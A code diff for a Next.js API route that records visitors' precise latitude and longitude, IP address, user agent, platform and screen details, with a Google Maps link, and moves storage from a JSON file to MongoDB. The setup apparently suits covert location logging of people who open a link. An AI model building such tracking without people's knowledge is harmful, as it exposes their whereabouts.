@@ -1,25 +1,18 @@
 import { NextResponse } from 'next/server';
-import fs from 'fs';
-import path from 'path';
-
-const LOG_FILE = path.join(process.cwd(), 'data', 'locations.json');
-
-// Ensure data directory exists
-if (!fs.existsSync(path.join(process.cwd(), 'data'))) {
-  fs.mkdirSync(path.join(process.cwd(), 'data'));
-}
+import connectToDatabase from '@/lib/mongodb';
+import Location from '@/models/Location';
 
 export async function POST(req) {
   try {
+    await connectToDatabase();
+    
     const data = await req.json();
-    const { lat, lon, accuracy, platform, screen } = data;
+    const { lat, lon, accuracy, platform, screen, context } = data;
     
     const ip = req.headers.get('x-forwarded-for') || req.ip || 'Unknown';
     const userAgent = req.headers.get('user-agent') || 'Unknown';
     
-    const logEntry = {
-      id: Date.now(),
-      timestamp: new Date().toISOString(),
+    const newLocation = new Location({
       ip,
       userAgent,
       lat,
@@ -27,21 +20,11 @@ export async function POST(req) {
       accuracy,
       platform,
       screen,
+      context,
       googleMapsUrl: `https://www.google.com/maps?q=${lat},${lon}`
-    };
+    });
 
-    // Read existing logs
-    let logs = [];
-    if (fs.existsSync(LOG_FILE)) {
-      const fileContent = fs.readFileSync(LOG_FILE, 'utf8');
-      logs = JSON.parse(fileContent);
-    }
-
-    // Add new entry
-    logs.push(logEntry);
-
-    // Save logs
-    fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
+    await newLocation.save();
 
     return NextResponse.json({ success: true });
   } catch (error) {
